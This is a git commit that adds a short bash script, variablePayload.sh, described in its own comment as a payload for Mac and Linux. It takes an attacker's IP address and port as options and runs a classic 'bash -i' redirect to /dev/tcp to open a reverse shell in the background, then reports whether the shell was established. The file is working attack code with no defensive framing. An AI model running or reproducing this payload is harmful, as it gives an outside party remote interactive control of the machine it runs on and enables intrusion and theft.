033e7ca94a5a3b68aea25e4015c325efa15e5378
SkepticSeptic <87040881+SkepticSeptic@users.noreply.github.com>
2023-09-26 07:42:40 -0400

    Create variablePayload.sh

---
+++ variablePayload.sh
@@ -0,0 +1,29 @@
+#!/bin/bash
+
+#dont touch unless youre modifying the actual payload for mac/linux
+
+while getopts ":I:P:" opt; do
+  case $opt in
+    I) IP_ADDRESS="$OPTARG"
+    ;;
+    P) PORT="$OPTARG"
+    ;;
+    \?) echo "Invalid option -$OPTARG" >&2
+    exit 1
+    ;;
+  esac
+done
+
+echo "Attempting to establish reverse shell on $IP_ADDRESS:$PORT..."
+
+bash -i >& /dev/tcp/$IP_ADDRESS/$PORT 0>&1 &
+
+# Wait for a brief moment to allow the shell to establish
+sleep 1
+
+# Check if the background process (bash -i) is still running
+if ps | grep $! > /dev/null; then
+    echo "Shell established!"
+else
+    echo "Failed to establish shell."
+fi
